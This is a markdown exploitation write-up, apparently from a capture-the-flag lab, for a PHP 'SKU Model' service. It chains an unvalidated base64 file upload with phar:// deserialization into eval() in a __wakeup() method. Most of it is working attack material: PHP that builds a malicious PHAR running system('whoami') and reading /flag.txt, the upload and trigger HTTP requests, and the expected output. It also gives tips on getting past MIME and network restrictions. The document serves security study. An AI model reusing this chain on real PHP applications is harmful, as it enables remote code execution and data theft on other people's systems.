# Complete RCE Chain Exploitation - SKU Model Service

## Vulnerability Summary

This document outlines the complete exploitation chain from arbitrary file upload through Remote Code Execution in the SKU Model microservice.

### Vulnerability Chain Overview

```
sku_process.php (Arbitrary Upload)
        ↓
    Upload PHAR with malicious CustomTemplate
        ↓
    File saved to /tmp/{hash}.jpg (returned in response)
        ↓
read_sku.php (Deserialization)
        ↓
    POST file_path to read_sku.php
        ↓
    phar:// wrapper extracts manifest
        ↓
unserialize() on manifest content
        ↓
CustomTemplate::__wakeup() triggered
        ↓
eval($this->data) → RCE
```

## Step-by-Step Exploitation

### Step 1: Create Malicious PHAR Archive

The attacker creates a PHP script to generate a PHAR archive containing a serialized CustomTemplate object:

```php
<?php
// Load the vulnerable class from the target application
require_once 'ReadClass.php';

// Create a CustomTemplate object with PHP code to execute
$payload = new CustomTemplate(
    'shell',
    'echo "RCE Achieved!"; system("whoami"); system("cat /flag.txt");'
);

// Serialize the object
$serialized = serialize($payload);

// Create and configure PHAR archive
$phar = new Phar('malicious.phar');
$phar->startBuffering();

// Add the serialized object as the manifest file
$phar->addFromString('manifest', $serialized);

// Set PHAR compression and complete buffering
$phar->setMetadata(['exploit' => 'CustomTemplate RCE']);
$phar->stopBuffering();

// Output the PHAR binary for encoding
$pharContent = file_get_contents('malicious.phar');
echo base64_encode($pharContent);
?>
```

### Step 2: Base64 Encode PHAR

The PHAR binary is base64-encoded (already done in the PHP above) for transmission:

```bash
base64 -w0 < malicious.phar > malicious.phar.b64
PAYLOAD=$(cat malicious.phar.b64)
```

### Step 3: Upload PHAR via sku_process.php

Send the base64-encoded PHAR to the upload endpoint:

```bash
# Request
POST /sku_process.php HTTP/1.1
Host: skumodel:4455
Content-Type: application/x-www-form-urlencoded
Content-Length: [length]

data=[BASE64_ENCODED_PHAR]

# Response
{
    "status": "success",
    "message": "Image uploaded successfully.",
    "file_name": "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6.jpg",
    "file_path": "/tmp/a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6.jpg"
}
```

### Step 4: Trigger Deserialization RCE

Send the file path to read_sku.php to trigger deserialization:

```bash
# Request
POST /read_sku.php HTTP/1.1
Host: skumodel:4455
Content-Type: application/x-www-form-urlencoded
Content-Length: [length]

file_path=/tmp/a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6.jpg

# The endpoint will:
# 1. Read phar:///tmp/{hash}.jpg/manifest
# 2. Extract the serialized CustomTemplate object
# 3. Call unserialize() which triggers __wakeup()
# 4. __wakeup() calls eval() with the PHP payload
# 5. Code executes!
```

### Step 5: Receive Command Output

The output from the executed code is returned in the response:

```bash
# Response
{
    "status": "success",
    "output": "RCE Achieved!
uid=33(www-data) gid=33(www-data) groups=33(www-data)
<contents of /flag.txt>
"
}
```

## Why This Works

### 1. No File Type Validation in sku_process.php

```php
$decodedData = base64_decode($data);
$randomHash = bin2hex(random_bytes(16));
$filePath = "/tmp/{$randomHash}.jpg";

if (file_put_contents($filePath, $decodedData) !== false) {
    // File saved - no checks on actual content!
}
```

The endpoint:
- Accepts ANY base64-encoded data
- Decodes without validation
- Saves to /tmp with forced .jpg extension
- Returns the exact file path used

### 2. Unsafe Deserialization in read_sku.php

```php
$content = file_get_contents('phar://' . $filePath . '/manifest');
$object = unserialize($content);  // TRIGGERS __wakeup()!
```

The endpoint:
- Uses phar:// wrapper to access PHAR contents
- Calls unserialize() without validation
- This automatically triggers magic methods
- No checks on deserialized object type

### 3. RCE in CustomTemplate.__wakeup()

```php
class CustomTemplate {
    public $data;
    
    public function __wakeup() {
        eval($this->data);  // ARBITRARY CODE EXECUTION!
    }
}
```

The class:
- Uses eval() to execute code
- Triggered automatically during unserialization
- No input validation or sandboxing
- Full PHP execution context

## Security Analysis

### Why Standard Protections Don't Work

1. **File Extension Bypass**: While .jpg extension may prevent Apache execution in standard configs, the PHAR archive doesn't need to be executed as PHP - it's deserialized via the phar:// wrapper

2. **MIME Type Checking**: Absent entirely - even if present, can be bypassed with polyglot files

3. **Content Validation**: Absent entirely - accepts any binary data

4. **Access Control**: nginx config restricts to 172.0.0.0/8, but this can be bypassed via localhost redirection or internal network access

## Exploitation Requirements

- Access to POST parameters (no authentication required)
- PHP with Phar extension enabled (it is)
- phar.readonly = Off (it is configured this way)
- File write permissions to /tmp (always available)

## Impact

Complete Remote Code Execution as the web server user (www-data):
- Read sensitive files
- Execute arbitrary commands
- Modify application logic
- Create persistent backdoors
- Pivot to other systems

## Timeline

1. Create PHAR: ~1 second
2. Upload via sku_process.php: ~100ms
3. Trigger via read_sku.php: ~100ms
4. Total exploitation time: ~1.2 seconds

## Affected Versions

- PHP 7.4 with phar extension
- Any application using Phar deserialization with eval()

## Fix Priority

**CRITICAL** - Immediate remediation required.

